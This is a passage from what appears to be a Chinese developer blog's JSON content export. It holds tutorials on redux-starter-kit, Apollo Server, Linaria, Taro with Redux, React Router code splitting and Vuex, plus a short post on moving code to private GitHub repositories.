驱动的变异不可变数据。","text":"前言众所周知，Redux 的核心从一开始就很小，最初的意图始终是保持核心小，使 API 可扩展，发展生态系统。这使得使用 Redux 需要编写很多基础性的代码，带来了许多无必要的重复劳动。 redux-starter-kit 是 Redux 官方推出的一个工具库，它旨在简化 Redux 的编写代码，在 Redux 核心周围添加了一些实用工具，例如简化的存储设置，最常用的选项和一些健全性检查，带有查找表定义的简化 reducer 和 Immer 驱动的变异不可变数据。 redux-starter-kit 提供了以下的特性： configureStore - 简化的配置选项，它可以自动组合切片 reducer，以及提供中间件和 devtool 的设置。 createReducer - 允许您为 case reducer 函数提供操作类型的查找表，并且会自动使用 immer 来让数据变成不可变。 createAction - 它返回给定 action 类型字符串的操作创建函数。 createSlice - 它接受一组 reducer 函数，一个切片名称和一个初始状态值，并自动生成相应的动作创建器，类型和简单的选择器函数。 createSelector - 用于创建 memoized 选择器函数，集成了 selectorator 库的功能。 安装安装相关依赖库。 1yarn add redux-starter-kit 基本使用下面就介绍几个 API 的使用。 configureStoreStore 是一个单一的数据源，在使用 Redux 的时候，第一步就是要创建一个 Store。 configureStore 是用于一键创建 Store 的 API 函数。 1234567891011import &#123; configureStore &#125; from 'redux-starter-kit';import rootReducer from './reducers';const store = configureStore(&#123; reducer: rootReducer, middleware: [], devTools: false, preloadedState: &#123;&#125;,&#125;);export default store; createReducerreducer 是 Redux 的核心概念，使用 reducer 决定数据状态的变化，有效的维护数据之间的关系。 createReducer 是用于一键创建 reducer 的 API 函数。 123456789101112131415// 第一个参数是 initStateconst todosReducer = createReducer([], &#123; ADD_TODO(state, action) &#123; state.push(action.payload); return state; &#125;, TOGGLE_TODO(state, action) &#123; const todo = state[action.payload.index]; todo.completed = !todo.completed; return state; &#125;, REMOVE_TODO(state, action) &#123; return state.filter((todo, i) =&gt; i !== action.payload.index); &#125;,&#125;); 在 Reducer 里需要的是返回新的状态才可以更新，这导致了，大量数据嵌套时，代码异常的复杂。createReducer 使用了 immer 为我们解决了这个问题。 123456789101112131415161718// 之前的写法const newState = &#123; ...state, first: &#123; ...state.first, second: &#123; ...state.first.second, [action.someId]: &#123; ...state.first.second[action.someId], fourth: action.someValue &#125; &#125; &#125;&#125;;// 使用 createReducer 之后const &#123; someId, someValue &#125; = action.payload;state.first.second[someId] = someValue; createActionaction 是用于改变数据的一个行为变化。 createAction 是用于一键创建 Action 的 API 函数。 12345678910111213141516const addTodo = createAction('ADD_TODO');addTodo(&#123; text: 'Buy milk' &#125;);// &#123; type : \"ADD_TODO\", payload : &#123; text : \"Buy milk\" &#125;&#125;)console.log(actionCreator.toString())// \"ADD_TODO\"console.log(actionCreator.type);// \"ADD_TODO\"const todosReducer = createReducer([], &#123; [addTodo](state, &#123; payload &#125;) &#123; state.push(payload); return state; &#125;,&#125;); 当在 Action 里需要异步的时候，可以尝试这样写，在外层包装一个函数（需要结合 thunk 中间件）。 12345const asyncAction = async () =&gt; (dispatch, getState) =&gt; &#123; dispatch(addTodo(&#123; text: 'start' &#125;)); await new Promise(rs =&gt; setTimeout(rs, 1000)); dispatch(addTodo(&#123; text: 'end' &#125;));&#125; createSliceRedux状态通常被组织成 “切片”，也叫模块，由传递给的 Reducer 定义 combineReducers。 createSlice 是用于一键创建切片的 API 函数。 12345678910111213141516171819202122const postsSlice = createSlice(&#123; slice: 'posts', initialState: [], reducers: &#123; createPost(state, &#123; payload &#125;) &#123; state.push(payload); return state; &#125;, updatePost(state, action) &#123;&#125;, deletePost(state, action) &#123;&#125;, &#125;,&#125;);console.log(postsSlice);/* &#123; actions : &#123; createPost, updatePost, deletePost, &#125;, reducer,&#125; */ createSlice 具有了 createReducer 和 createAction 两个 api 的功能。 12345export const actions = postsSlice.actions;export default reducer = postsSlice.reducer;actions.createPost(&#123; id: 1, title: 'Hello World' &#125;);// &#123; type: 'posts/createPost', payload: &#123; id : 1, title : 'Hello World' &#125; &#125; createSelectorselector 函数通常具有可记忆的，用来高效地计算 Redux store 里的衍生数据。 createSelector 是用于一键创建 selector 的 API 函数。 12345678910111213const getSubtotal = createSelector( ['shop.items'], items =&gt; &#123; // ... &#125;,);const getTax = createSelector( [getSubtotal, 'shop.taxPercent'], (subtotal, taxPercent) =&gt; &#123; // ... &#125;,); 参考资料 https://redux-starter-kit.js.org https://github.com/reduxjs/redux/issues/3321","categories":[{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/categories/Redux/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/tags/Redux/"}]},{"title":"Apollo Server（GraphQL）使用指南","slug":"Nodejs/Apollo Server（GraphQL）使用指南","date":"2019-02-15T03:21:32.000Z","updated":"2021-06-15T06:10:52.831Z","comments":true,"path":"/stories/2019/02/Nodejs/Apollo Server（GraphQL）使用指南/","link":"","permalink":"http://me.lizhooh.com/stories/2019/02/Nodejs/Apollo Server（GraphQL）使用指南/","excerpt":"前言Apollo Server 是一个 Apollo 开源的一个基于 Nodejs 的 GraphQL 后端服务集成方案。主要提供 GraphQL 后端的数据解析，查询，突变等解析功能，可以提供给任何的 GraphQL 客户端查询。 关联文章： React Apollo（GraphQL）使用指南 使用 GraphQL 取代 REST 的开始","text":"前言Apollo Server 是一个 Apollo 开源的一个基于 Nodejs 的 GraphQL 后端服务集成方案。主要提供 GraphQL 后端的数据解析，查询，突变等解析功能，可以提供给任何的 GraphQL 客户端查询。 关联文章： React Apollo（GraphQL）使用指南 使用 GraphQL 取代 REST 的开始 安装安装 GraphQL 相关的依赖，并且安装 koa 来展示使用效果。 1yarn add apollo-server graphql 基本使用下面的代码示例，如何编写一个简单的 GraphQL 服务器。 1234567891011121314151617181920212223242526272829303132333435363738const &#123; ApolloServer, gql &#125; = require('apollo-server');// 模拟的数据const books = [&#123; title: 'Harry Potter and the Chamber of Secrets', author: 'J.K. Rowling',&#125;, &#123; title: 'Jurassic Park', author: 'Michael Crichton',&#125;];const typeDefs = gql` # 模型 type Book &#123; title: String author: String &#125; # 查询 type Query &#123; books: [Book] &#125;`;// 解析器（决定查询，突变）返回什么数据const resolvers = &#123; Query: &#123; books: () =&gt; books, &#125;,&#125;;const server = new ApolloServer(&#123; typeDefs, resolvers &#125;);// 可以使用 listen，也可以作为中间件与 express/koa 结合server.listen().then((&#123; url &#125;) =&gt; &#123; console.log(`🚀 Server ready at $&#123;url&#125;`);&#125;); 好了，当我们在 GraphQL 客户端（GraphQL Background）输入查询语句，可以到处相应的数据返回。 与 Express/Koa 服务集成Apollo Server 可以不单独的启动服务，而是与 Express/Koa 一起集成，对于 Express 使用 apollo-server-express，对于 Koa 使用 apollo-server-koa。 下面是 Koa 的示例。 12yarn add apollo-server-koa@rcyarn add koa koa-router koa-body 123456789101112131415161718192021const &#123; ApolloServer, gql &#125; = require('apollo-server-koa');const Koa = require('koa');const Router = require('koa-router');const body = require('koa-body');// 忽略了 typeDefs，resolversconst server = new ApolloServer(&#123; typeDefs, resolvers &#125;);const app = new Koa();const router = new Router();router.get('/', ctx =&gt; &#123; ctx.body = 'hello';&#125;);// 这里把 server 绑定到 koa 路由里server.applyMiddleware(&#123; app &#125;);app.use(body()).use(router.routes());app.listen(3010, () =&gt; &#123; console.log(`🚀 Server ready at http://localhost:3010$&#123;server.graphqlPath&#125;`);&#125;); 数据分页在很多时候，对于列表的数据查询都需要做分页的，那么在 Apollo Server 里怎么做数据分页？实际上非常简单，可以为查询添加参数。 1234# 查询type Query &#123; books(offset: Int, limit: Int): [Book]&#125; 添加两个用于分页查询的参数 offset 和 limit，之后就可以在 resolvers 里获取用户输入的参数值，利用这两个参数在数据库查询时构造分页。 12345678const resolvers = &#123; Query: &#123; books: (root, &#123; offset = 0, limit = 10 &#125;) =&gt; &#123; // db.books.find().skip(offset).limit(limit); return books; &#125;, &#125;,&#125;; 模拟数据GraphQL API 的强类型特性非常适合模拟数据。在 server 的配置项里使用 mocks 属性就可以启动自动的模拟数据，在前期前端 UI 开发的时候非常有利。 1const server = new ApolloServer(&#123; typeDefs, mocks: true &#125;); 接下来查询的数据，它会按照数据的类型返回模拟数据。 还可以指定对应类型的模拟数据。 12345678910111213const mocks = &#123; // 对于类型的数据 Int: () =&gt; Math.random() * 1000 | 0, Float: () =&gt; (Math.random() * 100 | 0) / 100, String: () =&gt; Math.random().toString(32), // 对于模型的数据 Person: () =&gt; (&#123; name: casual.name, age: () =&gt; casual.integer(0, 120), &#125;),&#125;;const server = new ApolloServer(&#123; typeDefs, mocks &#125;); 错误处理Apollo Server 提供了一些预定义的错误，包括 AuthenticationError，ForbiddenError，UserInputError 和通用 ApolloError，这些错误旨在增强 GraphQL 执行之前和期间抛出的错误。 当解析器内部和外部的 Apollo Server 发生错误时，errors 数组内部的每个错误都将包含一个 extensions 包含 Apollo 服务器添加的信息的对象。在默认的情况下 Apollo Server 会把当前服务器的栈堆信息显示出来，要想关闭使用 debug: false 即可。 Apollo Server 构造函数接受 formatError 在传递回客户端的每个错误上运行的函数，库用于集中式的错误日志采集，或做统一的错误处理。 123456789const server = new ApolloServer(&#123; typeDefs, resolvers, debug: false, formatError: error =&gt; &#123; console.log(error); return new Error('Internal server error'); &#125;,&#125;); 当发生错误时，您可能希望返回其他信息，下面使用 UserInputError 来返回自定义的错误。 12345678910111213const resolvers = &#123; Query: &#123; books: async (root, &#123; offset = 0, limit = 10 &#125;) =&gt; &#123; if (offset &lt; 0 || limit &lt; 0) &#123; throw new UserInputError('Incorrect parameter range', &#123; offset: offset, limit: limit, &#125;); &#125; return books; &#125;, &#125;,&#125;; 可以看到，当 offset 或 limit 的值小于 0 时，就抛出了相关的错误。 如果需要定义特定于应用程序的其他错误代码，则可以使用通用的 ApolloError 类。 12345678910111213const resolvers = &#123; Query: &#123; books: async (root, &#123; offset = 0, limit = 10 &#125;) =&gt; &#123; if (offset &lt; 0 || limit &lt; 0) &#123; throw new ApolloError('参数范围错误', 404, &#123; offset: offset, limit: limit, &#125;); &#125; return books; &#125;, &#125;,&#125;; REST 数据源有时候，想要现有的 REST API 系统保持不变，并扩充一个 GraphQL 服务，可以在 resolvers 里获取相应的数据。 12345678const resolvers = &#123; Query: &#123; books: async (root, &#123; offset = 0, limit = 10 &#125;) =&gt; &#123; const res = await fetch('https://movies-api.example.com/') return res.json(); &#125;, &#125;,&#125;; 自定义类型标量GraphQL 提供了几种基本的数据类型，有时候需要一些复合的数据类型，例如 Date，这时候可以参数自定义类型标量。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051const &#123; GraphQLScalarType &#125; = require('graphql');const moment = require('moment');const books = [&#123; title: 'Harry Potter and the Chamber of Secrets', author: 'J.K. Rowling', time: '2019-02-15 13:48:50', // &lt;-- Here&#125;, &#123; title: 'Jurassic Park', author: 'Michael Crichton', time: 1550209975481, // &lt;-- Here&#125;];const MyDate = new GraphQLScalarType(&#123; name: 'MyDate', description: '自定义的 Date 类型', // 返回的数据 serialize(value) &#123; if (typeof value === 'number') &#123; return moment(value).format('YYYY-MM-DD HH:mm:ss');; &#125; return value; &#125;, parseValue(value) &#123; return value; &#125;, parseLiteral(ast) &#123; return ast.value; &#125;,&#125;);const typeDefs = gql` scalar Date # &lt;-- Here # 模型 type Book &#123; title: String author: String time: Date # &lt;-- Here &#125; # 查询 type Query &#123; books(offset: Int, limit: Int): [Book] &#125;`;const resolvers = &#123; Date: MyDate, // &lt;-- Here Query,&#125;; GraphQL 的数据类型是强类型，这意味着一个字段必须只属于一个类型，但是在实际的开发里，前端需要的数据类型可能会有多种类型，这时候可以利用自定义类型标量解决这个问题。 例如有一个字段 Data，它有时候是 Array，有时候是 Object。 123456789101112131415161718192021222324252627const books = [&#123; title: 'Harry Potter and the Chamber of Secrets', author: 'J.K. Rowling', time: '2019-02-15 13:48:50', data: [1, 2, 3],&#125;, &#123; title: 'Jurassic Park', author: 'Michael Crichton', time: 1550209975481, data: &#123; title: '斯柯达', &#125;,&#125;];const MyData = new GraphQLScalarType(&#123; name: 'MyData', description: '自定义的 Data 类型', serialize(value) &#123; return value; &#125;, parseValue(value) &#123; return value; &#125;, parseLiteral(ast) &#123; return ast.value; &#125;,&#125;); 访问认证在配置项里提供了，提供了请求上下文的属性，可以在上下文里根据请求头判断认证的信息，如果认证失败，则抛出错误。 1234567891011121314const server = new ApolloServer(&#123; typeDefs, resolvers, context: ctx =&gt; &#123; // 获取用户令牌 const token = ctx.ctx.req.header.token || ''; // 根据 token 获取用户信息 const user = getUser(token); if (!user) &#123; // 认证失败，抛出错误 throw new ApolloError('用户认证失败', 502); &#125; &#125;,&#125;); 集成测试结合 Jest 可以在 Apollo Server 上做集成测试。 1234567891011121314151617181920212223const &#123; createTestClient &#125; = require('apollo-server-testing');const &#123; query, mutate &#125; = createTestClient(server);describe('Apollo Server 测试', () =&gt; &#123; test('查询测试', async () =&gt; &#123; const res = await query(&#123; query: GET_USER, variables: &#123; id: 1 &#125;, &#125;); expect(res).toEqual(&#123; // ... &#125;); &#125;); test('突变测试', () =&gt; &#123; const res = await mutate(&#123; mutation: UPDATE_USER, variables: &#123; id: 1, email: 'nancy@foo.co' &#125; &#125;); expect(res).toEqual(&#123; // ... &#125;); &#125;);&#125;); 服务配置项ApolloServer 的配置项有以下几项： typeDefs - GraphQL 代码。 resolvers - 解析器中定义的类型与解析行为。 context - 当前请求的上下文。 rootValue - 创建传递给 graphql 执行程序的根值。 mocks - 是否开启模拟数据。 mockEntireSchema - 控制现有的解析器是否被模拟数据覆盖。 schemaDirectives - 引用 typeDefs。 engine - 代理密钥。 subscriptions - 定义订阅路径的字符串或定义订阅服务器的对象。 schema - 它将覆盖 typeDefs、resolvers。 formatError - 全局的错误处理。 tracing - 将跟踪或 cacheControl 元数据添加到 GraphQL 响应中。 validationRules - 架构验证规则。 debug - 是否开启 debug 模式。 playground - 是否开启 playground 调试器。 introspection - 启用和禁用模式内省。默认情况下生产环境禁用。 persistedQueries - 用于存储散列和查询字符串之间的映射。 cors - 是否支持跨域请求。 参考资料 https://www.apollographql.com/docs/apollo-server/ https://www.apollographql.com/docs/apollo-server/api/apollo-server.html http://graphql.cn/","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"💅 Linaria 使用指南","slug":"React/Style/Linaria 使用指南","date":"2019-02-13T09:29:38.000Z","updated":"2021-06-15T06:10:52.884Z","comments":true,"path":"/stories/2019/02/React/Style/Linaria 使用指南/","link":"","permalink":"http://me.lizhooh.com/stories/2019/02/React/Style/Linaria 使用指南/","excerpt":"前言相对于 JavaScript 的突飞猛进，CSS 的发展缓慢，相对止步不前。随着前端职能扩大化成为常态，前端工程化日趋成熟，CSS 先天缺陷愈发明显，这样就催生了许多 CSS in JS 的库。Linaria 是一个与 Styled-Components 类似的 css in js 库，可以在 React 上使用。 开始首先需要安装，以及配置 babel。 1yarn add linaria","text":"前言相对于 JavaScript 的突飞猛进，CSS 的发展缓慢，相对止步不前。随着前端职能扩大化成为常态，前端工程化日趋成熟，CSS 先天缺陷愈发明显，这样就催生了许多 CSS in JS 的库。Linaria 是一个与 Styled-Components 类似的 css in js 库，可以在 React 上使用。 开始首先需要安装，以及配置 babel。 1yarn add linaria 配置 webpack 选项。 123456789101112&#123; test: /\\.js$/, use: [ &#123; loader: 'babel-loader' &#125;, &#123; loader: 'linaria/loader', options: &#123; sourceMap: process.env.NODE_ENV !== 'production', &#125;, &#125; ],&#125; 配置 .babelrc： 1234567&#123; \"presets\": [ \"@babel/preset-env\", \"@babel/preset-react\", \"linaria/babel\" ]&#125; 基本使用123456789import &#123; css &#125; from 'linaria';const header = css` text-transform: uppercase; font-size: 13px;`;// Then use it as a class name&lt;h1 class=&#123;header&#125;&gt;Hello world&lt;/h1&gt;; 还可以定义组件容器： 123456789101112131415161718192021222324import &#123; styled &#125; from 'linaria/react';import &#123; families, sizes &#125; from './fonts';const Title = styled.h1` font-family: $&#123;families.serif&#125;;`;const Container = styled.div` font-size: $&#123;sizes.medium&#125;px; color: $&#123;props =&gt; props.color&#125;; border: 1px solid red; &amp;:hover &#123; border-color: blue; &#125; $&#123;Title&#125; &#123; margin-bottom: 24px; &#125;`;&lt;Container color=\"#333\"&gt; &lt;Title&gt;Hello world&lt;/Title&gt;&lt;/Container&gt; 参考资料 https://github.com/callstack/linaria","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"Taro + Redux 正确姿势","slug":"小程序/Taro + Redux 正确姿势","date":"2019-02-11T15:40:36.000Z","updated":"2021-06-15T06:10:52.912Z","comments":true,"path":"/stories/2019/02/小程序/Taro + Redux 正确姿势/","link":"","permalink":"http://me.lizhooh.com/stories/2019/02/小程序/Taro + Redux 正确姿势/","excerpt":"前言Taro 是使用 React 开发小程序的技术栈，当然也可以使用 Redux 进行管理数据。在 Taro cli 里有 Redux 的模版代码，但是本人并不推荐使用 Taro 提供的模版代码，因为这样写代码会比较多。下面来看看笔者自创的 Redux 代码写法。 初始化在创建项目时，选项 Redux 的模版代码，接着安装相关依赖包。","text":"前言Taro 是使用 React 开发小程序的技术栈，当然也可以使用 Redux 进行管理数据。在 Taro cli 里有 Redux 的模版代码，但是本人并不推荐使用 Taro 提供的模版代码，因为这样写代码会比较多。下面来看看笔者自创的 Redux 代码写法。 初始化在创建项目时，选项 Redux 的模版代码，接着安装相关依赖包。 12taro init myAppnpm install redux-store-init 开发目录把 src 目录整理成以下的目录结构。 在 store 目录下放置 reducers，action 相关代码。 在 app.js 修改 store 的来源。 1import store from './store'; 在 store/index 里放置初始化 store 代码，并且把相关函数导出。 123456789101112131415161718192021// store/index.jsimport Store from 'redux-store-init';import * as reducers from './reducers';const store = Store(&#123; reducers &#125;);export const getState = (name) =&gt; store.getState()[name];export const dispatch = (...arg) =&gt; store.dispatch(...arg);export const commit = (name, newState) =&gt; &#123; if (typeof newState === 'function') &#123; store.dispatch(&#123; type: name, newState &#125;); return; &#125; if (typeof newState === 'object') &#123; store.dispatch(&#123; type: name, newState: state =&gt; (&#123; ...state, ...newState &#125;) &#125;); return; &#125; store.dispatch(&#123; type: name, newState: () =&gt; newState &#125;);&#125;export default store; 在 store/reducers 里放置创建 reducers 的代码。 1234567// store/reducers.js/* eslint-disable import/prefer-default-export */import &#123; createReducer &#125; from 'redux-store-init';export const index = createReducer('index', &#123; count: 1,&#125;); 在 store/action 里放置创建 action 的代码。 12345678910111213141516import &#123; commit &#125; from '..';// name@注释export const add = () =&gt; &#123; commit('index@add', state =&gt; (&#123; count: state.count + 1 &#125;));&#125;export const minus = () =&gt; &#123; commit('index@minus', state =&gt; (&#123; count: state.count - 1 &#125;));&#125;// 异步的 actionexport function asyncAdd() &#123; setTimeout(add, 1000);&#125; 在 pages/index 里进行连接和调用 action 函数。 1234567891011121314151617181920import Taro, &#123; Component &#125; from '@tarojs/taro';import &#123; View, Button, Text &#125; from '@tarojs/components';import &#123; connect &#125; from '@tarojs/redux';import &#123; add, minus, asyncAdd &#125; from '../../store/actions/index';@connect(state =&gt; (&#123; state: state.index &#125;))export default class Index extends Component &#123; render() &#123; const &#123; count &#125; = this.props.state; return ( &lt;View className='index'&gt; &lt;Button className='add_btn' onClick=&#123;add&#125;&gt;+&lt;/Button&gt; &lt;Button className='dec_btn' onClick=&#123;minus&#125;&gt;-&lt;/Button&gt; &lt;Button className='dec_btn' onClick=&#123;asyncAdd&#125;&gt;async&lt;/Button&gt; &lt;View&gt;&lt;Text&gt;&#123;count&#125;&lt;/Text&gt;&lt;/View&gt; &lt;/View&gt; ) &#125;&#125; 完成，代码简单明了。","categories":[{"name":"小程序","slug":"小程序","permalink":"http://me.lizhooh.com/categories/小程序/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"小程序","slug":"小程序","permalink":"http://me.lizhooh.com/tags/小程序/"}]},{"title":"Github 支持私有后","slug":"前端/Github 支持私有后","date":"2019-01-22T14:12:36.000Z","updated":"2021-06-15T06:10:52.903Z","comments":true,"path":"/stories/2019/01/前端/Github 支持私有后/","link":"","permalink":"http://me.lizhooh.com/stories/2019/01/前端/Github 支持私有后/","excerpt":"","text":"前言Github 支持私有后，我把 32 个仓库的代码设置为私有（private）。 不得不说，Github 上实在挺多伸手党，之前就有一个项目，被国人生生的抄了过去，不是 fork 而是把代码拿过去之后自己重建了一个仓库，并修改了协议与 README 说明。 这实在是恶心，之后一些重要的个人项目，不想开源的我都放在 Coding，现在 Github 支持私有了，没必要在跑一圈 Coding。 有时候用 Github 并不是为了开源，只是想找一个云的地方放代码而已。像这种伸手党行为在国内比较严重，毕竟林子大了什么人都有，像 CSDN 一样到处都充斥着抄袭，复制粘贴等现象。","categories":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/categories/前端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://me.lizhooh.com/tags/JavaScript/"}]},{"title":"React Router 4 Code Splitting","slug":"React/Router/React Router 4 Code Splitting","date":"2019-01-16T04:38:15.000Z","updated":"2021-06-15T06:10:52.882Z","comments":true,"path":"/stories/2019/01/React/Router/React Router 4 Code Splitting/","link":"","permalink":"http://me.lizhooh.com/stories/2019/01/React/Router/React Router 4 Code Splitting/","excerpt":"前言webpack 有一个功能就是将你的代码库分割成 chunks（语块），当代码运行到需要它们的时候再进行加载。在默认情况下，React Router 4 并不提供代码切分功能，因此你自己去配置。","text":"前言webpack 有一个功能就是将你的代码库分割成 chunks（语块），当代码运行到需要它们的时候再进行加载。在默认情况下，React Router 4 并不提供代码切分功能，因此你自己去配置。 代码切分对于使用 create-react-app 创建的项目来说，在项目目录下创建一个 .babelrc 文件。 1234&#123; \"presets\": [\"@babel/preset-react\"], \"plugins\": [\"@babel/plugin-syntax-dynamic-import\"]&#125; 因此还需要安装对应的模块： 1yarn add '@babel/plugin-syntax-dynamic-import' '@loadable/component' @loadable/component 是用于异步加载组件，是一个用于加载动态导入组件的库，它自动处理各种边缘情况，使代码切分变得简单！ 如果是单独对于某个组件进行异步加载，那么可以这样写： 12345678910111213141516const asyncLoad = (C) =&gt; &#123; const View = loadable(C, &#123; fallback: &lt;LoadPageIcon /&gt; &#125;); return (props) =&gt; &lt;View &#123;...props&#125; /&gt;;&#125;;const AsyncButton = asyncLoad(() =&gt; import('../button'));class MyApp extends Component &#123; render() &#123; return ( &lt;div&gt; &lt;AsyncButton title='test' /&gt; &lt;/div&gt; ); &#125;&#125; 如果是对于路由的页面进行异步加载，你可以这样写： 1234567891011121314151617import React from 'react';import loadable from '@loadable/component';import Index from '../views/Index';import LoadPageIcon from '../components/common/LoadPageIcon';export default [ &#123; path: '/index', exact: true, component: Index, // &lt;-- 正常加载 &#125;, &#123; path: '/chart', exact: true, // &lt;-- 异步加载 component: asyncLoad(import('../views/Chart')), &#125;,]; 你也可以使用 react-loadable，大致都一样。 123456789import loadable from 'react-loadable';const asyncLoad = (C) =&gt; &#123; const View = loadable(&#123; loader: C, loading: LoadPageIcon, &#125;); return (props) =&gt; &lt;View &#123;...props&#125; /&gt;;&#125; 或者你可以自己写一个也没问题。 123456789101112131415161718192021222324252627282930313233import React, &#123; Component &#125; from 'react';import LoadIcon from '../common/LoadPageIcon';// 高阶异步组件export default loadCop =&gt; class AsyncComponent extends Component &#123; constructor (props) &#123; super(props); this.state = &#123; View: null, &#125;; &#125; // 异步加载 componentWillMount() &#123; if (this.state.View !== null) &#123; return; &#125; const p = typeof loadCop === 'function' ? loadCop() : loadCop; p.then(module =&gt; module.default).then((View) =&gt; &#123; this.setState(&#123; View &#125;); &#125;).catch((err) =&gt; &#123; console.error('Cannot load component in &lt;AsyncComponent /&gt;'); throw err; &#125;); &#125; render() &#123; const &#123; View &#125; = this.state; return (View) ? &lt;View &#123;...this.props&#125; /&gt; : &lt;LoadIcon /&gt;; &#125;&#125;; 参考资料 https://github.com/jamiebuilds/react-loadable https://github.com/smooth-code/loadable-components","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/tags/Redux/"},{"name":"React-Router","slug":"React-Router","permalink":"http://me.lizhooh.com/tags/React-Router/"}]},{"title":"Vuex Module 下 MapXxx 函数怎么写？","slug":"Vue/Vuex Module 下 MapXxx 函数怎么写？","date":"2019-01-13T08:54:31.000Z","updated":"2021-06-15T06:10:52.901Z","comments":true,"path":"/stories/2019/01/Vue/Vuex Module 下 MapXxx 函数怎么写？/","link":"","permalink":"http://me.lizhooh.com/stories/2019/01/Vue/Vuex Module 下 MapXxx 函数怎么写？/","excerpt":"","text":"前言ModuleModule 就是一个 store 的切片概念，可以划分命名空间，建议划分命名空间。 MapGettersgetter 其实和 computed 很像。 有 namespaced 的写法： 123computed: &#123; ...mapGetters('test', ['count']),&#125;, 没有 namespaced 这种写法： 123456computed: &#123; ...mapGetters(&#123; // 把 `this.doneCount` 映射为 `this.$store.getters.doneTodosCount` doneCount: 'doneTodosCount' &#125;);&#125; MapStateMapState 有几种写法，一般映射在 computed 里。 1234computed: mapState(&#123; count: state =&gt; state.test.count, count2: state =&gt; state.test2.count,&#125;), 有 namespaced 就是这种写法： 1mapState('test', &#123; count: state =&gt; state.count &#125;); MapActions触发 action 使用 dispatch 函数，它有一个特点就是不分 Module。例如有两个 Module 为 test，test2 里面都有 add action 函数，那么 dispatch(&#39;add&#39;) 会同时触发两个函数。解决方法：1. Module 里严格不出现同名 action，2. 使用 namespaced 指定。 对于没有指定 namespaced 的 Module，MapActions 好像做不到提供函数耶？这个问题有待考察。 有 namespaced 时就是这样写： 1234methods: &#123; ...mapActions('test', ['add', 'asyncAdd']), ...mapActions('user', ['login', 'logout']),&#125; 等于自己手写的 methods： 12345678methods: &#123; add() &#123; this.$store.dispatch('test/add', 10); &#125;, asyncAdd() &#123; this.$store.dispatch('test/asyncAdd', 10); &#125;&#125; MapMutation没有 namespaced 就是这种写法： 12345methods: &#123; ...mapMutations(&#123; add: 'increment' // 将 `this.add()` 映射为 `this.$store.commit('increment')` &#125;),&#125; 有 namespaced 这样写： 123methods: &#123; mapMutations('test', ['add']),&#125;","categories":[{"name":"Vue","slug":"Vue","permalink":"http://me.lizhooh.com/categories/Vue/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"Vue","slug":"Vue","permalink":"http://me.lizhooh.com/tags/Vue/"}]},{"title":"Vuex 极速入门","slug":"Vue/Vuex 极速入门","date":"2019-01-13T08:54:31.000Z","updated":"2021-06-15T06:10:52.901Z","comments":true,"path":"/stories/2019/01/Vue/Vuex 极速入门/","link":"","permalink":"http://me.lizhooh.com/stories/2019/01/Vue/Vuex 极速入门/","excerpt":"前言本文讲述怎么在使用 vue-cli 创建的项目中里使用 vuex，包括文件结构规划。","text":"前言本文讲述怎么在使用 vue-cli 创建的项目中里使用 vuex，包括文件结构规划。 创建项目先使用 vue-cli 创建项目，如果还没安装 cli 先安装。 1npm install -g vue-cli 初始化项目： 1vue create hello-world 引入 vuex在项目里安装 vuex 模块。 1npm install vuex --save 接着创建一个 stores 目录，创建 index.js，modules 目录（后面用）。 在 index.js 里初始化创建一个 store，因为 vuex 需要遵循单一数据源的原则。 123456789101112import &#123; Store &#125; from 'vuex';export default () =&gt; new Store(&#123; state: &#123; count: 0 &#125;, mutations: &#123; increment(state) &#123; state.count++ &#125; &#125;&#125;); 这是已经成功创建了 vuex 了，那么接下来连接到 Vue 里。 123456789101112import Vue from 'vue';import vuex from 'vuex';import App from './App.vue';import createStore from './stores';Vue.use(vuex);Vue.config.productionTip = false;new Vue(&#123; render: h =&gt; h(App), store: createStore(),&#125;).$mount('#app'); 使用 state接下来如何使用 store 里的 state 呢？在 vue 组件里可以通过 this.$store.xxx 来获取。 接着在 App.vue 里修改代码： 12345678910111213141516&lt;template&gt; &lt;div id='app'&gt; &#123;&#123; count &#125;&#125; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: 'App', data() &#123; return &#123; count: this.$store.state.count &#125;; &#125;&#125;;&lt;/script&gt; 是的，这是使用 this.$store.state.count 是没有任何智能提示的。 如果每次都这样写，代码会显得很累赘，那么 vuex 提供一个 mapState 来帮你省去麻烦，当然缺点就是看不见 mapState 之后有什么。 123456import &#123; mapState &#125; from 'vuex';export default &#123; name: 'App', computed: mapState(['count'])&#125;; 唯一改变的是你需要将 data 转移到 computed 里。 数据的改变当要触发数据的改变时你需要使用到 action、dispatch、mutation。 更改 Vuex 的 store 中的状态的唯一方法是提交 mutation。Vuex 中的 mutation 非常类似于事件：每个 mutation 都有一个字符串的 事件类型 (type) 和 一个 回调函数 